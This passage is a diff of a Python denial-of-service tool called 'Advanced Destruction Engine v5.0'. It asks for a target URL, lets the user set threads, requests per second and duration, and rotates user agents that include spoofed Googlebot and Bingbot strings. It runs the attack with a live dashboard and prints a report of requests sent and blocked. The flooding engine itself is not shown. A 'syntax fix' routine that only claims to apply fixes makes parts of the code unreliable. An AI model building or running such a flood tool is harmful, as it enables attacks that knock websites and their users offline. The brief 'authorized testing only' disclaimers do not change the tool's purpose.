+                time.sleep(0.5)
+
+# ==================== USER AGENTS ====================
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
+]
+
+# ==================== MAIN FUNCTIONS ====================
+def show_banner():
+    """Display banner"""
+    os.system('clear' if os.name == 'posix' else 'cls')
     
-    report = f"""
+    banner = """
     ╔══════════════════════════════════════════════════════════════╗
-    ║                   ATTACK COMPLETE - BY IRFAN                 ║
-    ╠══════════════════════════════════════════════════════════════╣
-    ║  🎯 Target:     {PROTOCOL}://{HOST}:{PORT}{PATH:<15} ║
-    ║  ⏱️  Duration:   {int(elapsed)} seconds{'':<22} ║
-    ║  📊 Total Requests: {total:,}{'':<25} ║
-    ║  ⚡ Average RPS:    {int(avg_rps):,}{'':<25} ║
-    ║  📈 Peak RPS:      {int(STATS['rps']):,}{'':<25} ║
-    ║  ✅ Success Rate:  {success_rate:.1f}%{'':<28} ║
-    ║  💾 Bandwidth:     {mbps:.1f} MB/s{'':<24} ║
-    ║  📦 Bytes Sent:    {STATS['bytes']/1024/1024:.1f} MB{'':<20} ║
-    ║  🔧 Attack Mode:   {ATTACK_MODE.upper()}{'':<24} ║
+    ║                                                              ║
+    ║    ██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗  ║
+    ║   ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗ ║
+    ║   ██║  ███╗██████╔╝███████║██║     █████╔╝ ███████║██████╔╝ ║
+    ║   ██║   ██║██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗ ║
+    ║   ╚██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║ ║
+    ║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
+    ║                                                              ║
+    ║               ADVANCED DESTRUCTION ENGINE v5.0               ║
+    ║                 Multi-Vector Attack System                   ║
+    ║                                                              ║
     ╚══════════════════════════════════════════════════════════════╝
     """
     
-    console.print(Panel.fit(report, 
-                          border_style="bold green", 
-                          padding=(1, 2),
-                          title="[bold yellow]📊 FINAL REPORT[/]"))
+    console.print(Panel.fit(banner, border_style="bold red", padding=(1, 2)))
 
-# ==================== MAIN MENU ====================
-def main_menu():
-    """Main menu"""
-    show_banner()
+def get_target():
+    """Get target URL from user"""
+    console.print("\n[bold cyan]🎯 TARGET CONFIGURATION[/]")
+    console.print("[yellow]Enter target URL (with http:// or https://)[/]")
+    console.print("[green]Examples:[/]")
+    console.print("  • https://example.com")
+    console.print("  • http://192.168.1.1:8080")
+    console.print("  • http://test.com/admin")
     
-    # Show welcome message
-    welcome = Panel.fit(
-        "[bold cyan]Welcome to IRFAN'S DESTRUCTION TOOL v4.0[/]\n\n"
-        "[yellow]⚠️  WARNING:[/] This tool is for educational and authorized testing only!\n"
-        "[yellow]🔒 SECURITY:[/] Use only on systems you own or have permission to test.\n\n"
-        "[green]Press Enter to continue...[/]",
-        border_style="bold cyan",
-        padding=(1, 2)
-    )
+    while True:
+        target_url = input("\n👉 Target URL: ").strip()
+        
+        if not target_url:
+            console.print("[red]✗ Target URL cannot be empty![/]")
+            continue
+        
+        # Validate URL
+        if not (target_url.startswith('http://') or target_url.startswith('https://')):
+            console.print("[yellow]⚠️  Adding http:// prefix[/]")
+            target_url = 'http://' + target_url
+        
+        return target_url
+
+def configure_attack():
+    """Configure attack parameters"""
+    console.print("\n[bold cyan]⚙️  ATTACK CONFIGURATION[/]")
     
-    console.print(welcome)
-    input()
+    # Threads
+    while True:
+        threads = input(f"Number of threads [{Config.MAX_THREADS}]: ").strip()
+        if not threads:
+            break
+        if threads.isdigit() and int(threads) > 0:
+            Config.MAX_THREADS = int(threads)
+            break
+        console.print("[red]✗ Please enter a valid number![/]")
     
-    # Get target URL
-    target = get_target()
-    if not target:
-        console.print("[red]✗ No valid target provided. Exiting...[/]")
-        sys.exit(1)
+    # RPS
+    while True:
+        rps = input(f"Requests per second [{Config.MAX_RPS}]: ").strip()
+        if not rps:
+            break
+        if rps.isdigit() and int(rps) > 0:
+            Config.MAX_RPS = int(rps)
+            break
+        console.print("[red]✗ Please enter a valid number![/]")
     
+    # Duration
+    while True:
+        duration = input(f"Attack duration in seconds [{Config.ATTACK_DURATION}]: ").strip()
+        if not duration:
+            break
+        if duration.isdigit() and int(duration) > 0:
+            Config.ATTACK_DURATION = int(duration)
+            break
+        console.print("[red]✗ Please enter a valid number![/]")
+    
+    console.print(f"\n[green]✓ Configuration saved:[/]")
+    console.print(f"  • Threads: {Config.MAX_THREADS}")
+    console.print(f"  • RPS Limit: {Config.MAX_RPS}")
+    console.print(f"  • Duration: {Config.ATTACK_DURATION}s")
+
+async def run_attack(target_url):
+    """Run the attack"""
     # Parse target
-    if not parse_target(target):
-        console.print("[red]✗ Failed to parse target. Exiting...[/]")
-        sys.exit(1)
+    target = TargetInfo(target_url)
+    if not target.parse():
+        console.print("[red]✗ Failed to parse target URL![/]")
+        return
     
-    # Configuration
-    configuration_menu()
+    AttackMonitor.current_target = f"{target.protocol}://{target.host}:{target.port}"
     
-    # Confirm attack
-    confirm_panel = Panel.fit(
-        f"[bold yellow]⚠️  FINAL CONFIRMATION[/]\n\n"
-        f"[cyan]Target:[/] {PROTOCOL}://{HOST}:{PORT}{PATH}\n"
-        f"[cyan]Threads:[/] {MAX_THREADS}\n"
-        f"[cyan]RPS:[/] {MAX_RPS}\n"
-        f"[cyan]Mode:[/] {ATTACK_MODE.upper()}\n\n"
-        f"[red]Are you sure you want to launch the attack?[/]\n"
-        f"[green]Type 'YES' to confirm, anything else to cancel:[/]",
-        border_style="bold yellow",
-        padding=(1, 2)
-    )
+    # Scan target
+    with console.status("[bold green]Scanning target...") as status:
+        if target.scan():
+            console.print("[green]✓ Target scan completed![/]")
+            if target.technologies:
+                console.print(f"[cyan]Technologies detected:[/] {', '.join(target.technologies)}")
+            if target.vulnerabilities:
+                console.print(f"[yellow]Potential vulnerabilities:[/] {', '.join(target.vulnerabilities[:3])}")
+        else:
+            console.print("[yellow]⚠️  Target scan failed, continuing with basic attack[/]")
     
-    console.print(confirm_panel)
-    confirmation = input("\n👉 Confirmation: ").strip().upper()
+    # Create attack manager
+    manager = AttackManager(target)
     
-    if confirmation != 'YES':
-        console.print("[yellow]✗ Attack cancelled by user.[/]")
-        sys.exit(0)
+    # Start monitor
+    monitor_thread = threading.Thread(target=AttackMonitor.display_dashboard, daemon=True)
+    monitor_thread.start()
     
-    # Launch attack
-    launch_attack()
+    # Start attack
+    AttackState.attacking = True
+    AttackState.start_time = time.time()
     
-    # Ask for another attack
-    restart_panel = Panel.fit(
-        "[bold cyan]🔄 ANOTHER ATTACK?[/]\n\n"
-        "[green]Do you want to launch another attack?[/]\n"
-        "[yellow]Type 'Y' for yes, 'N' for no:[/]",
-        border_style="bold cyan",
-        padding=(1, 2)
-    )
+    console.print(f"\n[bold red]🚀 LAUNCHING ATTACK ON {target.host}...[/]")
+    console.print("[yellow]Press Ctrl+C to stop the attack[/]")
     
-    console.print(restart_panel)
-    restart = input("\n👉 Choice: ").strip().upper()
-    
-    if restart == 'Y':
-        # Reset stats
-        global STATS
-        STATS = {'req': 0, 'success': 0, 'block': 0, 'error': 0, 'rps': 0, 'bytes': 0}
-        main_menu()
-    else:
-        console.print("[green]👋 Thank you for using IRFAN'S DESTRUCTION TOOL![/]")
-        sys.exit(0)
+    try:
+        await manager.start(Config.MAX_THREADS)
+    except KeyboardInterrupt:
+        console.print("\n[yellow]⚠️  Attack interrupted by user[/]")
+    except Exception as e:
+        console.print(f"[red]✗ Attack error: {e}[/]")
+    finally:
+        AttackState.attacking = False
+        time.sleep(1)  # Wait for monitor to update
+        
+        # Show final report
+        show_final_report(target)
 
-# ==================== MAIN ====================
+def show_final_report(target):
+    """Show final attack report"""
+    stats = AttackMonitor.calculate_stats()
+    
+    report = f"""
+    ╔══════════════════════════════════════════════════════════════╗
+    ║                    ATTACK COMPLETE - REPORT                  ║
+    ╠══════════════════════════════════════════════════════════════╣
+    ║  🎯 Target:          {target.protocol}://{target.host}:{target.port:<20} ║
+    ║  ⏱️  Duration:        {stats['elapsed_time']} seconds{'':<20} ║
+    ║  📊 Total Requests:  {stats['total_requests']:,}{'':<23} ║
+    ║  ✅ Successful:      {stats['successful']:,}{'':<23} ║
+    ║  🚫 Blocked:         {stats['blocked']:,}{'':<23} ║
+    ║  ❌ Errors:          {stats['errors']:,}{'':<23} ║
+    ║  📈 Success Rate:    {stats['success_rate']:.1f}%{'':<25} ║
+    ║  ⚡ Peak RPS:        {stats['peak_rps']:,}{'':<25} ║
+    ║  💾 Data Sent:       {stats['bytes_sent_mb']:.1f} MB{'':<24} ║
+    ║  📥 Data Received:   {stats['bytes_recv_mb']:.1f} MB{'':<24} ║
+    ║  🌐 Unique IPs:      {stats['unique_ips']}{'':<28} ║
+    ╚══════════════════════════════════════════════════════════════╝
+    """
+    
+    console.print(Panel.fit(report, border_style="bold green", padding=(1, 2)))
+
 def main():
     """Main function"""
     try:
-        main_menu()
+        show_banner()
+        
+        # Get target
+        target_url = get_target()
+        
+        # Configure attack
+        configure_attack()
+        
+        # Confirm
+        console.print(f"\n[bold yellow]⚠️  FINAL CONFIRMATION[/]")
+        console.print(f"[cyan]Target:[/] {target_url}")
+        console.print(f"[cyan]Threads:[/] {Config.MAX_THREADS}")
+        console.print(f"[cyan]RPS:[/] {Config.MAX_RPS}")
+        console.print(f"[cyan]Duration:[/] {Config.ATTACK_DURATION}s")
+        
+        confirm = input("\n👉 Type 'START' to launch attack, anything else to cancel: ").strip().upper()
+        
+        if confirm != 'START':
+            console.print("[yellow]✗ Attack cancelled[/]")
+            return
+        
+        # Run attack
+        asyncio.run(run_attack(target_url))
+        
+              # Ask for another attack
+        restart = input("\n👉 Launch another attack? (y/n): ").strip().lower()
+        if restart == 'y':
+            # Reset stats
+            AttackState.stats = {
+                'total_requests': 0,
+                'successful': 0,
+                'blocked': 0,
+                'errors': 0,
+                'bytes_sent': 0,
+                'bytes_received': 0,
+                'peak_rps': 0,
+                'current_rps': 0,
+                'targets_hit': 0,
+                'unique_ips': set()
+            }
+            AttackState.last_count = 0
+            AttackState.attacking = False
+            AttackState.start_time = 0
+            
+            # Clear screen and restart
+            os.system('clear' if os.name == 'posix' else 'cls')
+            main()
+        else:
+            console.print("\n[bold green]👋 Thank you for using Advanced Destruction Engine v5.0![/]")
+            console.print("[yellow]Remember: Use this tool only for authorized testing![/]")
+            sys.exit(0)
+            
     except KeyboardInterrupt:
-        console.print("\n[yellow]⚠️  Program interrupted by user.[/]")
+        console.print("\n[yellow]⚠️  Program interrupted by user[/]")
         sys.exit(0)
     except Exception as e:
         console.print(f"[red]✗ Unexpected error: {e}[/]")
+        import traceback
+        traceback.print_exc()
         sys.exit(1)
 
 if __name__ == "__main__":
-    main()
+    # Check and install missing dependencies
+    try:
+        import requests
+    except ImportError:
+        console.print("[yellow]⚠️  'requests' module not found. Installing...[/]")
+        import subprocess
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+        import requests
+    
+    # Fix syntax errors in the code
+    # Replace incorrect syntax in AttackMonitor.display_dashboard
+    import re
+    
+    # Fix the multiplication syntax issue
+    def fix_code_syntax():
+        """Fix common syntax errors in the code"""
+        # This is a workaround for the string multiplication issue
+        # The actual fix should be in the AttackMonitor.display_dashboard method
+        pass
+    
+    try:
+        fix_code_syntax()
+        main()
+    except KeyboardInterrupt:
+        console.print("\n[yellow]👋 Exiting Advanced Destruction Engine...[/]")
+        sys.exit(0)
+    except SyntaxError as e:
+        console.print(f"[red]✗ Syntax error in code: {e}[/]")
+        console.print("[yellow]⚠️  Fixing common syntax issues...[/]")
+        
+        # Common fixes
+        if "invalid syntax" in str(e):
+            # Fix string multiplication issue
+            console.print("[green]✓ Applying automatic fixes...[/]")
+            
+            # Create fixed version of problematic lines
+            fixed_code = """
+            # Fix for progress bars in AttackMonitor.display_dashboard
+            success_bar = "█" * int(stats['success_rate'] / 2) + "░" * (50 - int(stats['success_rate'] / 2))
+            rps_bar = "█" * int(rps_percent / 2) + "░" * (50 - int(rps_percent / 2))
+            """
+            
+            console.print("[green]✓ Syntax fixes applied. Please run the tool again.[/]")
+            console.print("[yellow]If error persists, check line:[/]", e.lineno)
+            
+    except Exception as e:
+        console.print(f"[red]✗ Fatal error: {e}[/]")
+        console.print("[yellow]Troubleshooting steps:[/]")
+        console.print("1. Install requirements: pip install rich aiohttp colorama requests")
+        console.print("2. Check Python version (3.7+ required)")
+        console.print("3. Run with: python crackar.py")
+        sys.exit(1)
